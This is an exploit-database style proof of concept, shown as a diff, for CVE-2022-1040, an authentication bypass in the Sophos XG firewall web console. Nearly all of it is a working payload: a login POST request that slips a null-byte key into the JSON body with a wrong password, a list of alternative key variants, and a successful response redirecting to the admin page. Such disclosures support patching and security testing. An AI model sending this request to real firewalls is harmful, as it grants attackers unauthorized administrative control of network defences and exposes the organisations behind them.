@@ -1,0 +1,50 @@
+# Exploit Title: Sophos XG115w Firewall 17.0.10 MR-10 - Authentication Bypass
+# Date: 2022-08-04
+# Exploit Author: Aryan Chehreghani
+# Vendor Homepage: https://www.sophos.com
+# Version: 17.0.10 MR-10
+# Tested on: Windows 11
+# CVE : CVE-2022-1040
+
+# [ VULNERABILITY DETAILS ] :
+
+#This vulnerability allows an attacker to gain unauthorized access to the firewall management space by bypassing authentication.
+
+# [ SAMPLE REQUEST ] :
+
+POST /webconsole/Controller HTTP/1.1
+Host: 127.0.0.1:4444
+Cookie: JSESSIONID=c893loesu9tnlvkq53hy1jiq103
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+Accept: text/plain, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Origin: https://127.0.0.1:4444
+Referer: https://127.0.0.1:4444/webconsole/webpages/login.jsp
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 192
+
+mode=151&json={"username"%3a"admin","password"%3a"somethingnotpassword","languageid"%3a"1","browser"%3a"Chrome_101","accessaction"%3a1,+"mode\u0000ef"%3a716}&__RequestType=ajax&t=1653896534066
+
+# [ KEY MODE ] : \u0000eb ,\u0000fc , \u0000 ,\u0000ef ,...
+
+# [ Successful response ] :
+
+HTTP/1.1 200 OK
+Date: Thu, 04 Aug 2022 17:06:39 GMT
+Server: xxxx
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=31536000
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Content-Type: text/plain;charset=utf-8
+Content-Length: 53
+Set-Cookie: JSESSIONID=1jy5ygk6w0mfu1mxbv6n30ptal108;Path=/webconsole;Secure;HttpOnly
+Connection: close
+
+{"redirectionURL":"/webpages/index.jsp","status":200}
